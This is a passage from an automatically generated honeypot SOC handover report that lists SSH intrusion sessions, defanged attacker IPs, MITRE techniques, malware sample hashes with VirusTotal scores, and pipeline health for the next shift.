| `2026-06-19 10:35:28` | `cowrie.login.success` |
| `2026-06-19 10:35:29` | `cowrie.session.params` |
| `2026-06-19 10:35:29` | `cowrie.command.input` |
| `2026-06-19 10:35:29` | `cowrie.command.failed` |
| `2026-06-19 10:35:29` | `cowrie.log.closed` |
| `2026-06-19 10:35:30` | `cowrie.session.params` |
| `2026-06-19 10:35:30` | `cowrie.command.input` |
| `2026-06-19 10:35:30` | `cowrie.session.file_download` |
| `2026-06-19 10:35:30` | `cowrie.log.closed` |
| `2026-06-19 10:35:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.98.62[.]211` to AbuseIPDB if not already reported
- [ ] Block `198.98.62[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eba77d38d22

| Field | Detail |
|---|---|
| **Source IP** | `198.98.62[.]211` |
| **First Seen** | 2026-06-19 10:35 |
| **Last Seen** | 2026-06-19 10:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-19 10:35:33` | `cowrie.session.connect` |
| `2026-06-19 10:35:33` | `cowrie.client.version` |
| `2026-06-19 10:35:33` | `cowrie.client.kex` |
| `2026-06-19 10:35:34` | `cowrie.login.success` |
| `2026-06-19 10:35:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.98.62[.]211` to AbuseIPDB if not already reported
- [ ] Block `198.98.62[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `134.209.241[.]3` | **319** | 2026-06-19 04:45 | 2026-06-19 10:41 | 219m | 0 | `T1592` | 🟠 MEDIUM |
| `143.198.233[.]61` | **203** | 2026-06-19 04:46 | 2026-06-19 10:36 | 210m | 0 | `T1592` | 🟠 MEDIUM |
| `217.148.142[.]94` | **91** | 2026-06-19 08:44 | 2026-06-19 09:31 | 45m | 0 | `T1592` | 🟠 MEDIUM |
| `139.135.60[.]221` | **19** | 2026-06-19 08:15 | 2026-06-19 08:19 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `216.144.229[.]11` | **15** | 2026-06-19 06:57 | 2026-06-19 10:36 | 8m | 0 | `T1592` | 🟠 MEDIUM |
| `14.116.189[.]74` | **7** | 2026-06-19 10:05 | 2026-06-19 10:12 | 13m | 0 | `T1592` | 🟢 LOW |
| `146.70.52[.]99` | **4** | 2026-06-19 05:23 | 2026-06-19 05:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.96.202[.]48` | **3** | 2026-06-19 07:54 | 2026-06-19 09:27 | 6m | 0 | `T1592` | 🟢 LOW |
| `134.122.23[.]93` | **3** | 2026-06-19 05:25 | 2026-06-19 07:02 | 2m | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]237` | **3** | 2026-06-19 07:27 | 2026-06-19 07:32 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `173.249.210[.]17` | **2** | 2026-06-19 05:11 | 2026-06-19 05:12 | 1m | 0 | `T1592` | 🟢 LOW |
| `20.169.104[.]255` | **2** | 2026-06-19 07:47 | 2026-06-19 07:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.106[.]58` | **2** | 2026-06-19 09:45 | 2026-06-19 09:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | **2** | 2026-06-19 06:43 | 2026-06-19 06:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.80.204[.]175` | **2** | 2026-06-19 08:20 | 2026-06-19 08:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]143` | **2** | 2026-06-19 10:36 | 2026-06-19 10:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.89[.]35` | 1 | 2026-06-19 07:27 | 2026-06-19 07:27 | 7s | 0 | `T1592` | 🟢 LOW |
| `101.96.195[.]62` | 1 | 2026-06-19 07:57 | 2026-06-19 07:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.195.81[.]146` | 1 | 2026-06-19 09:33 | 2026-06-19 09:33 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.112.194[.]160` | 1 | 2026-06-19 06:05 | 2026-06-19 06:05 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `107.172.127[.]226` | 1 | 2026-06-19 05:36 | 2026-06-19 05:36 | 30s | 0 | `T1592` | 🟢 LOW |
| `116.62.56[.]228` | 1 | 2026-06-19 04:58 | 2026-06-19 04:58 | 8s | 0 | `T1592` | 🟢 LOW |
| `117.50.185[.]190` | 1 | 2026-06-19 05:21 | 2026-06-19 05:22 | 54s | 0 | `T1592` | 🟢 LOW |
| `119.160.166[.]237` | 1 | 2026-06-19 08:04 | 2026-06-19 08:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `124.223.207[.]5` | 1 | 2026-06-19 09:12 | 2026-06-19 09:13 | 30s | 0 | `T1592` | 🟢 LOW |
| `129.121.54[.]208` | 1 | 2026-06-19 09:34 | 2026-06-19 09:34 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.115[.]253` | 1 | 2026-06-19 07:53 | 2026-06-19 07:53 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.137.238[.]102` | 1 | 2026-06-19 05:21 | 2026-06-19 05:22 | 30s | 0 | `T1592` | 🟢 LOW |
| `14.29.214[.]161` | 1 | 2026-06-19 10:31 | 2026-06-19 10:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `152.32.218[.]149` | 1 | 2026-06-19 10:04 | 2026-06-19 10:04 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `152.32.220[.]188` | 1 | 2026-06-19 09:37 | 2026-06-19 09:37 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `158.178.214[.]208` | 1 | 2026-06-19 10:25 | 2026-06-19 10:25 | 30s | 0 | `T1592` | 🟢 LOW |
| `159.65.222[.]96` | 1 | 2026-06-19 10:34 | 2026-06-19 10:34 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.175.90[.]193` | 1 | 2026-06-19 07:18 | 2026-06-19 07:19 | 69s | 1 | `T1110.001` | 🟢 LOW |
| `172.190.24[.]225` | 1 | 2026-06-19 07:32 | 2026-06-19 07:32 | 15s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.151.146[.]67` | 1 | 2026-06-19 05:58 | 2026-06-19 05:59 | 30s | 0 | `T1592` | 🟢 LOW |
| `195.201.133[.]217` | 1 | 2026-06-19 07:04 | 2026-06-19 07:04 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `198.98.62[.]211` | 1 | 2026-06-19 10:35 | 2026-06-19 10:35 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.71.254[.]235` | 1 | 2026-06-19 07:04 | 2026-06-19 07:04 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.228.97[.]97` | 1 | 2026-06-19 09:32 | 2026-06-19 09:32 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `219.248.65[.]30` | 1 | 2026-06-19 10:09 | 2026-06-19 10:10 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `23.254.205[.]135` | 1 | 2026-06-19 10:23 | 2026-06-19 10:24 | 30s | 0 | `T1592` | 🟢 LOW |
| `34.71.30[.]159` | 1 | 2026-06-19 10:25 | 2026-06-19 10:25 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `35.202.9[.]133` | 1 | 2026-06-19 09:59 | 2026-06-19 10:00 | 40s | 0 | `T1592` | 🟢 LOW |
| `37.114.49[.]41` | 1 | 2026-06-19 08:01 | 2026-06-19 08:01 | 31s | 0 | `T1592` | 🟢 LOW |
| `38.34.175[.]21` | 1 | 2026-06-19 07:09 | 2026-06-19 07:09 | 30s | 0 | `T1592` | 🟢 LOW |
| `43.156.152[.]52` | 1 | 2026-06-19 10:40 | 2026-06-19 10:40 | 30s | 0 | `T1592` | 🟢 LOW |
| `45.192.243[.]94` | 1 | 2026-06-19 04:55 | 2026-06-19 04:56 | 30s | 0 | `T1592` | 🟢 LOW |
| `58.220.39[.]200` | 1 | 2026-06-19 10:12 | 2026-06-19 10:12 | 10s | 0 | `T1592` | 🟢 LOW |
| `65.20.141[.]202` | 1 | 2026-06-19 08:40 | 2026-06-19 08:41 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.163[.]103` | 1 | 2026-06-19 07:33 | 2026-06-19 07:33 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.138.172[.]122` | 1 | 2026-06-19 07:49 | 2026-06-19 07:49 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 43/100 | 🟡 MEDIUM | **34/73** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 44/100 | 🟡 MEDIUM | **35/73** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `159.65.222[.]96` | US | DigitalOcean, LLC | **100** ⚠️ | 4 |
| `185.151.146[.]67` | SG | PT Wifipedia Sinergi Telematika | **100** ⚠️ | 3 |
| `43.156.152[.]52` | SG | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 2 |
| `116.62.56[.]228` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 40 |
| `23.254.205[.]135` | US | RackNerd LLC | **100** ⚠️ | 6 |
| `8.138.172[.]122` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 4 |
| `211.228.97[.]97` | KR | Korea Telecom | **100** ⚠️ | 29 |
| `38.34.175[.]21` | US | Enzu Inc. | **100** ⚠️ | 3 |
| `20.71.254[.]235` | NL | Microsoft Corporation | **100** ⚠️ | 30 |
| `14.29.214[.]161` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 48 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 19 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |

---

## 🔕 False Positive Summary (18 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 745 cases |
| Tool 34  | Credential Extractor        | ✅ 31 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 69 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 18 filtered (2.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 42 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 12 priority case(s) shown individually · 52 recon entry/entries in table (16 group(s) consolidating 679 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-19T10:43:46Z_
